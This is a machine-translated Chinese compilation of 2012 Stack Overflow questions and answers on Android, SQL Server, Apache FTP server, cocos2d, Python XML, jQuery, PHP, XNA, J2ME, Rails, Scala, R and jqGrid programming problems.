通过在 StackOverflow 上进行快速搜索，您可以很容易地找到它；例如[这个命中](https://stackoverflow.com/questions/2496698/android-custom-listadapter-extending-baseadapter-crashes-on-application-launch)。

此外，不要在 Java 中使用`==`运算符进行比较，而是调用.`String``string.equals("otherString")`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-27T08:55:51.487

替换下面的代码

```
View row = inflater.inflate(R.layout.custom_menu_row, parent); 
```

和

```
 View row = inflater.inflate(R.layout.custom_menu_row, null); 
```

# rtc - RTC流程图中的箭头说明

> ID：10347348
> 
> 赞同：2
> 
> 时间：2012-04-27T08:30:35.480
> 
> 标签：rtc

在下图中，下面的箭头是什么意思？

这就是我的想法：每个箭头都描述了变更集从哪里流出/流向哪里。因此顶部工作区流发生变化并接受来自流的变化。底部的两个工作区只是将更改流向流，这些工作区不接受来自流的任何更改。这个对吗 ？

破蓝色箭头是什么意思？

![在此处输入图像描述](../Images/4d57e97c445e60b9b34384255a68b6c9.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T08:47:26.403

虚线箭头表示：此流量目标当前不是当前**的**。

如果您打开流，您将看到一个带有目标列表的“流目标”部分。

每行可以有两个限定符：“default”和“current”。
任何不是“当前”的目标都将由虚线箭头表示。

当前意味着，当您请求查看一个流与另一个流之间的差异时，它将显示流与**当前**目标之间的所述差异。

* * *

另请参阅[此线程](https://jazz.net/forums/viewtopic.php?t=18428&watch=topic&start=0&sid=0b243f2e4cef0686b1b7ccd7994e22df)（更面向 repo 工作区和流之间的流目标）

> *   “当前”表示“这是将显示在 Pending Changes 视图中的流目标”。
> *   “默认”的意思是“如果您尝试交付给标记为“默认”的流量目标以外的流量目标，您将收到警告，询问您是否确定要交付给非默认目标。

* * *

> 这就是我的想法：每个箭头都描述了变更集从哪里流出/流向哪里。

是的，但这是一个“模型”：您不会直接交付/接受来自 Stream 的更改。您将始终从 repo 工作区执行此操作。

> 因此顶部工作区流发生变化并接受来自流的变化。

不完全是：

*   实心蓝色箭头表示您可以向流询问所述流和回购工作区之间的差异（此处无法交付，只是差异的可视化）
*   虚线蓝色箭头表示 repo 工作区知道 Stream（它被列为默认流目标，但所述流**不是**顶级 repo 工作区的当前流目标。
    这意味着“待定更改”视图不会显示与 Stream 相比，该 repo 工作区的任何差异（接受或交付）。

> 底部的两个工作区只是将更改流向流，这些工作区不接受来自流的任何更改。这个对吗 ？

否：目标意味着底部 repo 工作区知道 Stream（它们可以接受或交付更改），并且 Stream 是它们*当前*的流目标（“待定更改”视图主动监视底部 repo 工作区和 Stream 之间的差异。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-12T18:41:01.763

根据链接，

[http://www.ibm.com/developerworks/br/rational/library/parallel-development-rational-team-concert/](http://www.ibm.com/developerworks/br/rational/library/parallel-development-rational-team-concert/)

你的断言

> “当前”表示“这是将显示在 Pending Changes 视图中的流目标”。“默认”是指“如果您尝试交付给标记为“默认”的流量目标以外的流量目标，您将收到警告，询问您是否确定要交付给非默认目标”。

是绝对正确的。

# sql-server-2008 - 将计算字段设置为不可为空

> ID：10347354
> 
> 赞同：1
> 
> 时间：2012-04-27T08:31:09.050
> 
> 标签：sql-server-2008, entity-framework

我在 MSSQL 表视图中有一个计算字段。

```
CAST((MyCalcField) AS BIT) AS UsersManager 
```

当实体框架创建此视图的模型时，它总是将 UsersManager 字段设置为可为空。是否可以使用 SQL 将字段设置为不可为空？我知道我直接在 EF 模型中设置了字段类型，但我想在 MSSQL 中保留字段类型结构。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T08:40:56.353

尝试使用`ISNULL`

```
ISNULL(CAST((MyCalcField) AS BIT), 0) AS UsersManager 
```

# java - 从 user.properties 中检索用户

> ID：10347361
> 
> 赞同：0
> 
> 时间：2012-04-27T08:31:25.273
> 
> 标签：java, apache, ftp, ftp-server

我正在尝试使用 apache ftp 服务器 [http://mina.apache.org/ftpserver/设置一个 ftp 服务器](http://mina.apache.org/ftpserver/)

我想使用基于文件的管理，并且只有一个可以登录的用户。首先，我以这种方式创建文件：

```
String username = "ftp";
String password = "ftp";
String ftproot = "data";        

// prepares the user manager
PropertiesUserManagerFactory userManagerFactory = new PropertiesUserManagerFactory();
userManagerFactory.setFile(new File(propFile));
userManagerFactory.setPasswordEncryptor(new SaltedPasswordEncryptor());
UserManager um = userManagerFactory.createUserManager();
// set up my user
BaseUser user = new BaseUser();
user.setName(username);
user.setPassword(password);
user.setHomeDirectory(ftproot);
List<Authority> authorities = new ArrayList<Authority>();
authorities.add(new WritePermission());        
user.setAuthorities(authorities);

um.save(user);
// adds the user
serverFactory.setUserManager(um); 
```

该文件似乎没问题，如果我在每次启动时都执行这些步骤，则 ftp 服务器工作正常。

我想要的是能够设置此文件一次，然后只需加载属性文件，以便可以从代码中删除用户/密码。

我尝试了一段时间，但无法以这种方式运行任何东西。

任何帮助将不胜感激。提前谢谢你！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T08:52:47.463

好的，“告诉你的泰迪熊”方法再一次工作得很好。

我在发布后两分钟找到了解决方案。

无需进行所有配置，只需设置用户管理器。

```
userManagerFactory.setFile(new File(propFile));
userManagerFactory.setPasswordEncryptor(new SaltedPasswordEncryptor());
UserManager um = userManagerFactory.createUserManager();
serverFactory.setUserManager(um); 
```

这是我的整个加载配置方法。

希望这会对某人有所帮助。

我认为 apache ftp 服务器确实需要更多文档：S。

# iphone - 如何在 tmx 地图中提取折线点？

> ID：10347364
> 
> 赞同：1
> 
> 时间：2012-04-27T08:31:59.003
> 
> 标签：iphone, objective-c, ios, cocos2d-iphone

地图中的信息是：

```
 <objectgroup name="Waypoint" width="32" height="24">
  <object name="waypointsline" x="843" y="3">
   <polyline points="0,0 -13,130 -39,202 -69,237 -125,262 -162,295 -189,340 -184,376 -166,411 -124,453 -98,484 -78,529 -78,598 -80,659 -101,689 -200,695 -317,700 -453,696 -534,693 -566,656 -582,622 -585,563 -586,488 -577,428 -550,335 -547,284 -565,225 -599,190 -675,171 -751,164 -799,133 -829,93 -842,17"/>
  </object>
 </objectgroup> 
```

如何在 Objective-C 中提取它们？

我试过了：

```
 NSMutableDictionary *waypoints = [objects objectNamed:@"waypointsline"];
if(waypoints) {
    NSString* v = [waypoints valueForKey:@"waypointsline"];
} 
```

它返回零。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T08:52:30.880

TMX 中的折线和多边形在 cocos2d-iphone 2.0-rc0 版本中引入：

> [新] TileMap：从对象中解析多边形、polilines 和 gid（问题 #1311）

如果您使用的是比 2.0-rc0 更新的版本，我想您可以通过以下方式访问这些点：

```
CCTMXObjectGroup *objectGroup = [tileMapLayer objectGroupNamed:@"someGroup"];
NSMutableDictionary *waypoints = [[objectGroup objectNamed:@"waypointsline"];
NSString *v = [waypoints objectForKey:@"polylinePoints"]; 
```

更多详情请参考：

*   [如何：将 TMX 多边形对象转换为 box2d 形状以进行碰撞检测](http://www.cocos2d-iphone.org/forum/topic/28695)（看起来这篇文章中的类别实现可以帮助使用 2.0-rc0 之前的版本）
*   [cocos2d-iphone 问题 #1311](http://code.google.com/p/cocos2d-iphone/issues/detail?id=1311)
*   [cocos2d-iphone 问题 #1311 在 GitHub 上的更改](https://github.com/cocos2d/cocos2d-iphone/commit/59dcd3f75a8ced1b1e774259e54d9d57385f6d1d)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T08:34:52.243

你的数据是有`XML`格式的，所以你所要做的就是解析它`XML`。

如果是针对 Mac OS X，我建议您`NSXMLDocument`选择`NSXMLParser`.

但是，还有一种**更简单的方法**......

**下载：** [https ://github.com/Insert-Witty-Name/XML-to-NSDictionary](https://github.com/Insert-Witty-Name/XML-to-NSDictionary)

**接着 ：**

```
NSDictionary *dic = [XMLReader dictionaryForXMLString:myxml error:nil]; 
```

* * *

**更新**

* * *

为了获取您的 XML 字符串数据：

```
NSString* filepath = [[NSBundle mainBundle] pathForResource:@"map" ofType:@"tmx"];
NSString* myxml = [NSString stringWithContentsOfFile:filepath
                                            encoding:NSUTF8Encoding
                                               error:nil]; 
```

# python - python 2.7处理多个xml

> ID：10347365
> 
> 赞同：0
> 
> 时间：2012-04-27T08:32:00.997
> 
> 标签：python

首先：对不起我可怜的英语语言技能。其次：我已经学习python几个星期了，所以请耐心等待。:)

我的项目：我有一个包含多个文件（xml）的目录。

```
they looks like:    
            thingy1_442354565666.xml
            thingy2_502354565666.xml
            thingy3_692354565666.xml
            etc. 
```

文件名中的数字代表文件的最后修改日期。较大的数字表示最近的文件。（这将在以后很重要。）

每个 xml 包含两个元素。

```
for example:
        <period>012012</period>     # this represent months
        <charges>1098</charges>     # EUR 
```

问题：我需要每个月的输出 txt。

```
like this:  
        jan: 1098
        feb: 499
        etc. 
```

不幸的是，我在那个目录中有超过 12 个 xml，所以我每个月都有 2-3 个文件（我总是需要最后修改的文件）。

我试图用文件名和句点元素制作一个字典，但我完全迷路了。顺便说一句，我可以用 elementtree 等解析 xml，但我不知道如何选择每个月最后修改的文件。

请帮助我，并询问我是否无法理解。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T09:05:13.860

如果较大的数字意味着较旧的文件，请对文件列表进行排序并*从最小到最大*迭代文件（即首先是最新文件）。

解析 xml 并跟踪`(year, month)`您看到的对。如果您已经看过一对，那么您已经处理了该月的*最新*文件，您可以忽略后续文件。

就像是：

```
import glob
from datetime import datetime
from lxml import etree

def file_timestamp(filepath):
    """Return the timestamp from a file name"""
    filename = os.path.split(filepath)[1]
    filename = os.path.splitext(filename)[0]
    if '_' in filename:
        return filename.split('_')[1]
    return None

class Datafiles(object):
    def __init__(self, dir_path):
        self.date_cache = {}
        self.dir_path = dir_path

    def __iter__(self):
        return self.files()

    def next(self):
        return self.files().next()

    def files(self):
        filepaths = glob.glob(self.dir_path + '*_*.xml')
        filepaths = sorted(filepaths, key=file_timestamp)

        for filepath in filepaths:
            ## Parse data (xml)
            data = self.parse_file(filepath)
            ## If year/month is seen before, skip
            date = datetime.strptime(data['period'].text, '%m%Y')
            month = (date.year, date.month)
            if month in self.date_cache:
                continue

            ## Else store date and yield
            self.date_cache[month] = filepath
            yield data

    def parse_file(self, filepath):
        # YOUR XML PARSING HERE
        return etree.parse(filepath) 
```

用法：

```
>>> files = Datafiles(data_directory)
>>> for xml_data in files:
...     ## do something with the data 
```

# jquery - 加载/准备好 dom 后要调用的函数 - 激活右侧手风琴选项卡

> ID：10347367
> 
> 赞同：0
> 
> 时间：2012-04-27T08:32:04.603
> 
> 标签：jquery, .net, sharepoint

我正在尝试从服务器端运行脚本，但 DOM 尚未准备好。

我想激活正确的手风琴“标签”

```
function ValidateTermStoreProperties(index){
    $('#myProfileSettings').accordion('activate', index);
} 
```

我试过使用 .ready() 没有任何运气！我究竟做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T08:45:57.917

```
string activateAccordin = "$(document).ready(function(){$('#myProfileSettings').accordion('activate', 1);});"
Page.ClientScript.RegisterStartupScript(typeOf(Page),"ActivateTab", activateAccordin, true); 
```

尝试这个。

# php - 有没有比从 TSV 数据创建 PHP 数组更好的方法？

> ID：10347372
> 
> 赞同：1
> 
> 时间：2012-04-27T07:30:52.797
> 
> 标签：php, text-processing

假设一个带有标题行的制表符分隔值 (TSV) 文件，如何创建一个 PHP 数组，其中标题字段作为键，数据字段作为数据？

假设 $txtArray 包含文件中的所有行，

```
$hdrArray = explode( "\t", $txtArray[0]);
$i = 0;
foreach ($hdrArray as $hdr) {
  $heads[$hdr] = '';
  $headerNames[$i++] = $hdr;
}
for ($i = 1; $i < (count($txtArray) - 1); $i++ ) {
  $datArray = explode( "\t", $txtArray[$i]);
  if (count($datArray) > 1) {
    for($j = 0; $j < count($datArray); $j++) {
      $heads[$headerNames[$j]] = $datArray[$j];
    }
  }
  # process the line
} 
```

对于文件的每一行中的所有字段，我都有包含 field_name => field_data 的 $heads。有没有更好的编码方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T08:23:06.647

**什么才算“更好”？**

您可以使用正则表达式拆分使其更加健壮，但如果您可以控制源 CSV，则不必担心脏数据。

我看到的一个明显的优化是缓存 count() 结果。

**采用：**

```
for ($i = 1, $c=count($txtArray); $i < c - 1); $i++) 
```

**代替：**

```
for ($i = 1; $i < (count($txtArray) - 1); $i++ ) 
```

每次调用 count() 时，它都会重新计算结果。进行一次计算就足够了，因此您只需保存结果。

**我不明白你为什么需要：**

```
if (count($datArray) > 1) 
```

如果您正在使用“干净”数据，则每行应该有固定数量的值，因此无需对它们进行计数*和*检查。为了加快速度，您可以通过计算标题中的行数来缓存行长度。

**后：**

```
$hdrArray = explode( "\t", $txtArray[0]); 
```

**做：**

```
$c2 = count($hdrArray); 
```

**然后在第二个 for 循环中使用它：**

```
for($j = 0; $j < $c2; $j++) 
```

如果您*确实*必须担心空行，那么搜索空行并在循环中跳过它可能会更快。

**像这样：**

```
// skip the row if the $datArray contains an empty array
if($datArray == array()) {
    continue;
}
$heads[$headerNames[$j]] = $datArray[$j]; 
```

**你总共得到：**

```
$hdrArray = explode( "\t", $txtArray[0]);
$c2 = count($hdrArray);

// it has an iterator variable...
// I don't understand why you wouldn't use a for loop here
$i = 0;
foreach ($hdrArray as $hdr) {
    $heads[$hdr] = '';
    $headerNames[$i++] = $hdr;
}

for ($i = 1, $c = count($txtArray); $i < $c - 1; $i++) {
    $datArray = explode( "\t", $txtArray[$i]);
    for($j = 0; $j < $c2; $j++)
        // skip the row if the $datArray contains an empty array
        if($datArray == array()) {
            continue;
        }
        $heads[$headerNames[$j]] = $datArray[$j];
    }      
} 
```

我假设您的第一个实现有效，源数据实际上是 CSV（即固定数量的行/列。

我所做的只是应用一些简单（和常见）的优化来减少不必要的计算次数。很基本的东西，你会在一段时间后习惯看到。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-27T08:26:03.913

假设您的输入文件如下所示：

```
head1 head2 head3
v11   v12   v13
v21   v22   v23
v31   v32   v33 
```

一种更简单的解析方法是：

```
$hdrArray = explode("\t", $txtArray[0]); 
// array(3) { [0]=> string(5) "head1" [1]=> string(5) "head2" [2]=> string(6) "head3 " }

$length = count($txtArray) - 1; // having count in the for loop means it'll be executed at each iteration
$data   = array();

for($i = 1; $i <= $length; $i++) {
    $datArray = explode("\t", $txtArray[$i]); 
    // array(3) { [0]=> string(3) "v11" [1]=> string(3) "v12" [2]=> string(4) "v13 " }

    foreach($hdrArray as $key => $header) {
        $data[$i - 1][$header] = $datArray[$key]; // $i - 1 to start your $data array from 0
    }   
} 
```

你的`$data`数组看起来像：

```
array(3) {
  [0]=>
  array(3) {
    ["head1"]=>
    string(3) "v11"
    ["head2"]=>
    string(3) "v12"
    ["head3"]=>
    string(4) "v13"
  }
  [1]=>
  array(3) {
    ["head1"]=>
    string(3) "v21"
    ["head2"]=>
    string(3) "v22"
    ["head3"]=>
    string(4) "v23"
  }
  [2]=>
  array(3) {
    ["head1"]=>
    string(3) "v31"
    ["head2"]=>
    string(3) "v32"
    ["head3"]=>
    string(3) "v33"
  }
} 
```

您可以完全跳过`count`，但需要额外的迭代：

```
foreach($txtArray as $i => $value) {
    if($i == 0) continue; // header, move on

    $datArray = explode("\t", $value); 

    foreach($hdrArray as $key => $header) {
        $data[$i - 1][$header] = $datArray[$key];
    }   
} 
```

这实际上可能比使用 count 快一点，因为第一次迭代立即停止并且循环继续到下一次。但这实际上取决于阵列的大小，而收益/损失可能微不足道。

# xna - XNA 2D TileMap 接缝出现在瓷砖之间

> ID：10347375
> 
> 赞同：0
> 
> 时间：2012-04-27T08:32:40.853
> 
> 标签：xna, 2d

我正在尝试制作 2d 瓷砖地图，并且在将瓷砖相互叠加时遇到了一些接缝问题。这是一个屏幕截图：

[http://i.imgur.com/3zgcQ.png](http://i.imgur.com/3zgcQ.png)

我尝试了几种不同的方法来解决这个问题，包括在单独的 spritebatch.Begin()/End() 块中绘图。两层都使用完全相同的代码来获取它们的位置，所以它们应该直接绘制在另一层上，对吗？难道我做错了什么？我试图寻找答案无济于事:(任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T09:22:20.227

你是否在借鉴整个价值观？我的意思是 Vector2(0,0) 不是 Vector2(0.5f, 0.5f)。如果不是，你应该四舍五入。

这是询问有关游戏编程问题的更好网站： [https ://gamedev.stackexchange.com/](https://gamedev.stackexchange.com/)

# jquery-ui - jQuery UI 选项卡，将 GET 参数转换为 POST 参数

> ID：10347378
> 
> 赞同：0
> 
> 时间：2012-04-27T08:32:57.473
> 
> 标签：jquery-ui, jquery

我有一个 jQuery Ajax 选项卡：

```
<div id='tabs'>
    <ul>
        <li><a href="/echo/html/?html=1">Tab1</a></li>
        <li><a href="/echo/html/?html=2">Tab2</a></li>
        <li><a href="/echo/html/?html=3">Tab3</a></li>
        <li><a href="/echo/html/?html=4">Tab4</a></li>
    </ul>
</div>

$('#tabs').tabs({
    ajaxOptions:{
        type: 'post',
        data:{
            html:'<p>sample html content</p>'
        }
    }
}); 
```

[jsFiddle](http://jsfiddle.net/9pJ9e/2/)演示

我成功地将默认的 ajax GET 请求转换为 POST 请求，现在我想要将 (HTML) GET 参数设置为 POST 参数。有人有任何提示吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T08:42:59.980

嗨，您可以在每个选项卡中指定“数据”字段，您可以在 ajax 帖子中使用它；

```
<div id='tabs'>
    <ul>
        <li><a href="/echo/html/" data-html="1">Tab1</a></li>
        <li><a href="/echo/html/" data-html="2">Tab2</a></li>
        <li><a href="/echo/html/" data-html="3">Tab3</a></li>
        <li><a href="/echo/html/" data-html="4">Tab4</a></li>
    </ul>
</div>

var postVars = {};
$('#tabs').tabs({
    select: function(event, ui) {
        postVars = {
            param: $(ui.tab).data('html'),
        };
    },
    ajaxOptions:{
        type: 'post',
        data:postVars,
        error: function(xhr, status, index, anchor) {
            alert("Error occured");
        }
    }
}); 
```

你可以看看[jsfiddle](http://jsfiddle.net/9pJ9e/3/)演示

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-27T09:24:03.500

我解决了这个问题！
解决方案是在选择事件上重置 ajaxOptions！现在它可以工作了

```
<div id='tabs'>
    <ul>
        <li><a title="1" href="/echo/html/" data-html="1">Tab1</a></li>
        <li><a title="2" href="/echo/html/" data-html="2">Tab2</a></li>
        <li><a title="3" href="/echo/html/" data-html="3">Tab3</a></li>
        <li><a title="4" href="/echo/html/" data-html="4">Tab4</a></li>
    </ul>
</div>

$('#tabs').tabs({
    select: function(event, ui) {        
        var postVars = {
            html: $(ui.tab).attr('title'),
        };
        $(ui.tab).parent().parent().parent().tabs( "option", "ajaxOptions", { type:'post', data:postVars } );
    },
    ajaxOptions:{
        type: 'post',
        data:{
            html:$('#tabs a:first').attr('title')
        },
        error: function(xhr, status, index, anchor) {
            alert("Error occured");
        }
    }
}); 
```

演示：http: [//jsfiddle.net/9pJ9e/7/](http://jsfiddle.net/9pJ9e/7/)

# java-me - 调用 web 服务时 j2me 中的通话时间成本/网络访问消息

> ID：10347382
> 
> 赞同：1
> 
> 时间：2012-04-27T08:33:15.280
> 
> 标签：java-me, midp, signing, jsr172

我有一个带有 midp 1.0 的 j2me 应用程序

它完全适用于诺基亚 n8、诺基亚 5233 等其他设备，但是当我在索尼爱立信 Aspen 上测试此应用程序时，它给了我警告信息，例如

```
Untrusted application
  your application wants to send or receive information from
  http://myurl/getLaunchDateByDate.php?Launch_date=2012-04-27,
  this will use airtime which may cost you money.
  Do you allow Net access? 
```

它与应用程序签名有关吗？

# ruby-on-rails - 有没有办法在运行时从控制器视图路径中删除特定的视图路径？

> ID：10347383
> 
> 赞同：1
> 
> 时间：2012-04-27T08:33:19.033
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, view, view-path

我正在开发一个 Rails 3 应用程序，该应用程序具有针对特定用户或移动设备的不同子域。

这是视图结构的样子：

应用程序/

----观看次数/

- - - - 移动的/

- - - - 行政/

可以通过简单的调用将新的视图路径添加到路径集中

```
prepend_view_path(some_path) 
```

或者

```
append_view_path(some_path) 
```

现在，我也想删除它们。

有没有办法从控制器 path_set 中删除任何先前添加的路径？我在 API 中没有找到任何有用的方法，当使用我在数组上使用的标准方法时（`delete_at`例如），我得到以下 RuntimeError：

```
can't modify frozen array 
```

例如，我已经为来自移动设备的请求使用了不同的 mime 类型。如果我不能删除添加的路径，那还不错。我只是在寻找一种重置为“默认”视图路径的方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T09:03:33.520

Rails 提供了另外两个 getter 和 setter 方法——[分别是 view_paths()](http://apidock.com/rails/ActionController/Base/view_paths/class)和[view_paths=](http://apidock.com/rails/ActionController/Base/view_paths=/class)方法。我相信使用 'view_paths=' 方法，您可以删除动态附加的视图路径。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-28T15:41:49.430

看起来您想禁止普通用户使用管理功能。更好的方法是使用像['cancan'](https://github.com/ryanb/cancan)这样的 'authorization' 插件。

# scala - Scala：我可以声明一个在编译时不会生成 getter 和 setter 的公共字段吗？

> ID：10347384
> 
> 赞同：14
> 
> 时间：2012-04-27T08:33:35.833
> 
> 标签：scala

在 Scala 中，当您声明 val 或 var 时，Scala 会在编译为字节码时自动为您生成私有字段以及 getter 和 setter。

例如

```
class myClass {
    val name = "My Name"
} 
```

将编译以创建等效的

```
class myClass {
    private string name;
    public string name();
    public void name_$eq(string);
} 
```

其中 name() 和 name_$eq 是私有字符串名称的 getter 和 setter。

我知道您可以通过将私有字段声明为 private[this] val/var blah 来强制它不为私有字段提供 getter 和 setter，但我需要能够创建一个在编译时不生成 getter 和 setter 的公共字段.

这在 Scala 中是否可行？

谢谢

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-27T11:16:47.600

~~如您提供的示例中所示，生成的类不包含 getter 或 setter。~~生成的类不包含 java bean getter 或 setter。要真正使编译器为 a 生成`getX`和`setX`方法，`var`您需要使用`@BeanProperty`.

如果您想从 java 访问公共字段，我认为您很不幸。至少，我还没有看到仅使用 scala 来实现这一目标的方法。

您可以通过混合 scala 和 java 来完成它。使用如下 java 类：

```
public abstract class JavaClassWithPublicField {
   public String name = "My name";
} 
```

然后在您的 Scala 代码中继承该类：

```
class ScalaClassWithPubilcField extends JavaClassWithPublicField 
```

这可能是最干净的方法。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-27T20:41:17.363

大概您想强制使用属性的表示方式，因为您是从 Java 访问的。（如果您试图通过摆脱 getter 来“优化”您的字节码，那么您就是在浪费时间，VM 会很快将它们内联。）对您来说不幸的是，为将来尽可能敞开大门改进，Scala 规范[没有指定如何将 Scala 代码转换为字节码](http://www.scala-lang.org/node/265)。这意味着即使您找到了适用于给定版本的 Scala 的技巧，也不能保证它在后续版本中有效。

在这些情况下，推荐的方法是用 Java 编写 Java 可见的代码，然后用 Scala 编写一个小的粘合类——就像@Emil 给出的答案一样棒。

# r - 如何创建用于分配值的间隔序列

> ID：10347385
> 
> 赞同：0
> 
> 时间：2012-04-27T08:33:36.787
> 
> 标签：r, session, time, intervals, xts

我正在尝试找到将会话开始和结束时间之间的秒数分成 15 分钟间隔的最有效方法，以便我可以显示每个间隔中比特率的秒数和倍数。

以下是一些示例数据：

`df <- structure(list(username = structure(c(1L, 2L, 3L, 4L, 5L, 6L, 7L, 8L, 9L, 9L), .Label = c("user1", "user2", "user3", "user4", "user5", "user6", "user7", "user8", "user9"), class = "factor"), bitrate = structure(c(3500000, 7000000, 3500000, 3500000, 3500000, 7000000, 3500000, 7000000, 3500000, 7000000), class = "numeric"), start = structure(c(1322700567, 1322700984, 1322700646, 1322700883, 1322700042, 1322700073, 1322700547, 1322700794, 1322700694, 1322700934), tzone = "", class = c("POSIXct", "POSIXt")), end = structure(c(1322700766, 1322701250, 1322700945, 1322701270, 1322701284, 1322706303, 1322701781, 1322702307, 1322701600, 1322701224), tzone = "", class = c("POSIXct", "POSIXt"))), .Names = c("username", "birate", "start", "end"), row.names = c(NA, 10L), class = "data.frame")`

```
 username  birate               start                 end
1     user1 3500000 2011-12-01 01:49:27 2011-12-01 01:52:46
2     user2 7000000 2011-12-01 01:56:24 2011-12-01 02:00:50
3     user3 3500000 2011-12-01 01:50:46 2011-12-01 01:55:45
4     user4 3500000 2011-12-01 01:54:43 2011-12-01 02:01:10
5     user5 3500000 2011-12-01 01:40:42 2011-12-01 02:01:24
6     user6 7000000 2011-12-01 01:41:13 2011-12-01 03:25:03
7     user7 3500000 2011-12-01 01:49:07 2011-12-01 02:09:41
8     user8 7000000 2011-12-01 01:53:14 2011-12-01 02:18:27
9     user9 3500000 2011-12-01 01:51:34 2011-12-01 02:06:40
10    user9 7000000 2011-12-01 01:55:34 2011-12-01 02:00:24 
```

>

理想情况下，如果可能，我想在 R 中执行此操作，只需要 1 个日历日，要么在向量中显示秒数，要么将比特率向量分配为秒的倍数，例如秒：

```
session 01:30   01:45   02:00   02:15   02:30  etc.
   1        0      199      0       0       0  etc.
   2        0      266      0       0       0  etc.
  10        0      306      24      0       0  etc. 
```

我在想，要么按分钟排序，要么使用带有对齐时间的 xts 可能是最好的方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T14:23:59.767

我不确定这段代码是否正是您想要做的，但我希望它可以帮助您朝着期望的方向前进。

```
fun <- function(i, d) {
  idx <- seq(d$start[i],d$end[i],1)    # create sequence for index
  dat <- rep(d$birate[i],length(idx))  # create data over sequence
  xts(dat, idx, dimnames=list(NULL,d$username[i]))  # xts object
}

# loop over each row and put each row into its own xts object
xl <- lapply(1:NROW(df), fun, d=df)
# merge all the xts objects
xx <- do.call(merge, xl)
# apply a function (e.g. colMeans) to each 15-minute period
xa <- period.apply(xx, endpoints(xx, 'minutes', 15), colMeans, na.rm=TRUE) 
```

# c# - 将 jqGrid 与 Asp.Net Web 表单一起使用

> ID：10347386
> 
> 赞同：1
> 
> 时间：2012-04-27T08:33:49.360
> 
> 标签：c#, asp.net, jqgrid

我`Asp.Net/C#`在我的应用程序中使用，我有一个要求，我需要在其中显示数据`jqGrid`。数据应该来自`Users`表格。这是我第一次使用`jqGrid`，任何人都可以帮助我开始使用`jqGrid`。`Web Forms`任何示例或链接都会不胜感激。谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-27T08:38:07.687

请点击以下链接。

[http://blog.prabir.me/post/Using-jqGrid-with-ASPNET-Web-Forms-e28093-Part-I.aspx](http://blog.prabir.me/post/Using-jqGrid-with-ASPNET-Web-Forms-e28093-Part-I.aspx)

[http://forums.asp.net/t/1638413.aspx/1](http://forums.asp.net/t/1638413.aspx/1)

[http://wiki.asp.net/page.aspx/1774/jqgrid-and-aspnet-web-forms/](http://wiki.asp.net/page.aspx/1774/jqgrid-and-aspnet-web-forms/)

[http://praveen1305.blogspot.co.uk/2009/05/jqgrid-with-asp-net-web-forms.html](http://praveen1305.blogspot.co.uk/2009/05/jqgrid-with-asp-net-web-forms.html)

[在 ASP.NET WebForms 中使用 jqGrid](https://stackoverflow.com/questions/7034713/using-jqgrid-in-asp-net-webforms)

希望能帮助到你

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-27T09:07:01.620

您可以在任何应用程序中只包含一个空的表格元素和网格底部的寻呼机的空 div

```
<table id="grid" ></table>
<div id="pager"></div> 
```

然后你包括

```
<script type="text/javascript">
$(function () {
    $("#grid").jqGrid({
        url: 'someURLfromYourProject', // 'xxx.svc', 'xxx.asmx', 'xxx.ashx' ...
        datatype: 'json',
        pager: '#pager',
        gridview: true,
        height: 'auto',
        //... other parameters
    });
});
</script> 
```

这将在运行时修改网格中的空表和 div。网格中的数据将从`url`选项指定的 URL 中获取。

重要的是要了解，您可以非常轻松地将 WFC、ASMX Web 服务或 ASHX 处理程序集成到**任何**现有应用程序中。您只需将新页面（在 ASP.NET 项目的解决方案资源管理器中选择“添加新项目”上下文菜单）添加到现有项目。这样，您将创建更独立于主要在 ASP.NET 应用程序中使用的技术的代码。如果您稍后决定将应用程序迁移到 ASP.NET MVC，您甚至可以不更改应用程序的 WFC ASMX Web 服务或 ASHX 处理程序部分。

在[答案中](https://stackoverflow.com/a/8545518/315935)，您会找到一些带有演示项目的 URL，您可以下载并玩一下。您可以将大部分代码从 ASP.NET MVC 示例（请参阅[此处](https://stackoverflow.com/a/9349688/315935)和[此处](https://stackoverflow.com/a/5501644/315935)）移动到您的 WCF/ASMX/ASHX 代码中。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-02-26T21:39:35.257

**JQGRID 示例：-**

[从链接http://www.trirand.com/blog/?page_id=6](http://www.trirand.com/blog/?page_id=6)下载所需的所有脚本文件

**Design.aspx** 我已经在 aspx 页面的正文部分定义了脚本。

我将此网格仅用于搜索功能，因此我禁用了编辑和删除功能

```
 <script src="../JQGridReq/jquery-1.9.0.min.js"></script>
    <script src="../JQGridReq/grid.locale-en.js"></script>
    <link href="../JQGridReq/jquery-ui-1.9.2.custom.css" rel="stylesheet" />
    <script src="../JQGridReq/jquery.jqGrid.js"></script>
    <link href="../JQGridReq/ui.jqgrid.css" rel="stylesheet" />
         <link href="../JQGridReq/themes/start/theme.css" rel="stylesheet" />

          <script type="text/javascript">           
        jQuery("#jQGridDemo").jqGrid({
            url: '../Handlers/JQGridHandler.ashx',
            datatype: "json",
            colNames: ['TableID', 'Region_ID', 'Region_Name', 'ActionDate', 'Field', 'OldValue', 'NewValue', 'TableName', 'Who','Comment'],
            colModel: [
                        { name: 'TableID', index: 'TableID', width: 50, stype: 'text' },
